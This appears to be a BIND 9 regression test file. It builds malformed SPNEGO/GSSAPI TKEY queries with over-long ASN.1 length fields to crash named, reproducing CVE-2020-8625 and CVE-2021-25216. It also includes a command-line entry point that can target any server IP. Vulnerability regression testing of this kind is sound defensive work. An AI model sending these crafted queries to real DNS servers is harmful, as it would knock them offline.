#!/usr/bin/python
############################################################################
# Copyright (C) Internet Systems Consortium, Inc. ("ISC")
#
# SPDX-License-Identifier: MPL-2.0
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, you can obtain one at https://mozilla.org/MPL/2.0/.
#
# See the COPYRIGHT file distributed with this work for additional
# information regarding copyright ownership.
############################################################################

"""
A tool for reproducing ISC SPNEGO vulnerabilities
"""

import argparse
import struct
import time

import dns.name
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset
import pytest

import isctest

pytestmark = pytest.mark.extra_artifacts(
    [
        "ns1/K*",
        "ns1/example.nil.db",
    ]
)


class CraftedTKEYQuery:
    """
    A class for preparing crafted TKEY queries
    """

    def __init__(self, opts: argparse.Namespace) -> None:
        # Prepare crafted key data
        tkey_data = ASN1Encoder(opts).get_tkey_data()
        # Prepare TKEY RDATA containing crafted key data
        rdata = dns.rdata.GenericRdata(
            dns.rdataclass.ANY, dns.rdatatype.TKEY, self._get_tkey_rdata(tkey_data)
        )
        # Prepare TKEY RRset with crafted RDATA (for the ADDITIONAL section)
        rrset = dns.rrset.from_rdata(dns.name.root, dns.rdatatype.TKEY, rdata)

        # Prepare complete TKEY query to send
        self.msg = isctest.query.create(
            dns.name.root, dns.rdatatype.TKEY, dns.rdataclass.ANY
        )
        self.msg.additional.append(rrset)

    def _get_tkey_rdata(self, tkey_data: bytes) -> bytes:
        """
        Return the RDATA to be used for the TKEY RRset sent in the ADDITIONAL
        section
        """
        tkey_rdata = dns.name.from_text("gss-tsig.").to_wire()  # domain
        if not tkey_rdata:
            return b""
        tkey_rdata += struct.pack(">I", int(time.time()) - 3600)  # inception
        tkey_rdata += struct.pack(">I", int(time.time()) + 86400)  # expiration
        tkey_rdata += struct.pack(">H", 3)  # mode
        tkey_rdata += struct.pack(">H", 0)  # error
        tkey_rdata += self._with_len(tkey_data)  # key
        tkey_rdata += struct.pack(">H", 0)  # other size
        return tkey_rdata

    def _with_len(self, data: bytes) -> bytes:
        """
        Return 'data' with its length prepended as a 16-bit big-endian integer
        """
        return struct.pack(">H", len(data)) + data


class ASN1Encoder:
    """
    A custom ASN1 encoder which allows preparing malformed GSSAPI tokens
    """

    SPNEGO_OID = b"\x06\x06\x2b\x06\x01\x05\x05\x02"

    def __init__(self, opts: argparse.Namespace) -> None:
        self._real_oid_length = opts.real_oid_length
        self._extra_oid_length = opts.extra_oid_length

    # The TKEY RR being sent contains an encoded negTokenInit SPNEGO message.
    # RFC 4178 section 4.2 specifies how such a message is constructed.

    def get_tkey_data(self) -> bytes:
        """
        Return the key data field of the TKEY RR to be sent
        """
        return self._asn1(
            data_id=b"\x60", data=self.SPNEGO_OID + self._get_negtokeninit()
        )

    def _get_negtokeninit(self) -> bytes:
        """
        Return the ASN.1 DER-encoded form of the negTokenInit message to send
        """
        return self._asn1(
            data_id=b"\xa0",
            data=self._asn1(
                data_id=b"\x30",
                data=self._get_mechtypelist(),
                extra_length=self._extra_oid_length,
            ),
            extra_length=self._extra_oid_length,
        )

    def _get_mechtypelist(self) -> bytes:
        """
        Return the ASN.1 DER-encoded form of the MechTypeList to send
        """
        return self._asn1(
            data_id=b"\xa0",
            data=self._asn1(
                data_id=b"\x30",
                data=self._get_mechtype(),
                extra_length=self._extra_oid_length,
            ),
            extra_length=self._extra_oid_length,
        )

    def _get_mechtype(self) -> bytes:
        """
        Return the ASN.1 DER-encoded form of a bogus security mechanism OID
        which consists of 'self._real_oid_length' 0x01 bytes
        """
        return self._asn1(
            data_id=b"\x06",
            data=b"\x01" * self._real_oid_length,
            extra_length=self._extra_oid_length,
        )

    def _asn1(self, data_id: bytes, data: bytes, extra_length: int = 0) -> bytes:
        """
        Return the ASN.1 DER-encoded form of 'data' to be included in GSSAPI
        key data, designated with 'data_id' as the content identifier.  Setting
        'extra_length' to a positive integer allows data length indicated in
        the ASN.1 DER representation of 'data' to be increased beyond its
        actual size.
        """
        data_len = struct.pack(">I", len(data) + extra_length)
        return data_id + b"\x84" + data_len + data


def parse_options() -> argparse.Namespace:
    """
    Parse command line options
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("--server-ip", required=True)
    parser.add_argument("--server-port", type=int, default=53)
    parser.add_argument("--real-oid-length", type=int, default=1)
    parser.add_argument("--extra-oid-length", type=int, default=0)

    return parser.parse_args()


def send_crafted_tkey_query(opts: argparse.Namespace) -> None:
    """
    Script entry point
    """

    query = CraftedTKEYQuery(opts).msg

    isctest.query.tcp(query, opts.server_ip, timeout=2)


def test_cve_2020_8625():
    """
    Reproducer for CVE-2020-8625.  When run for an affected BIND 9 version,
    send_crafted_tkey_query() will raise a network-related exception due to
    named (ns1) becoming unavailable after crashing.
    """
    for i in range(0, 50):
        opts = argparse.Namespace(
            server_ip="10.53.0.1",
            real_oid_length=i,
            extra_oid_length=0,
        )
        send_crafted_tkey_query(opts)


def test_cve_2021_25216():
    """
    Reproducer for CVE-2021-25216.  When run for an affected BIND 9 version,
    send_crafted_tkey_query() will raise a network-related exception due to
    named (ns1) becoming unavailable after crashing.
    """
    opts = argparse.Namespace(
        server_ip="10.53.0.1",
        real_oid_length=1,
        extra_oid_length=1073741824,
    )
    send_crafted_tkey_query(opts)


if __name__ == "__main__":
    cli_opts = parse_options()
    send_crafted_tkey_query(cli_opts)
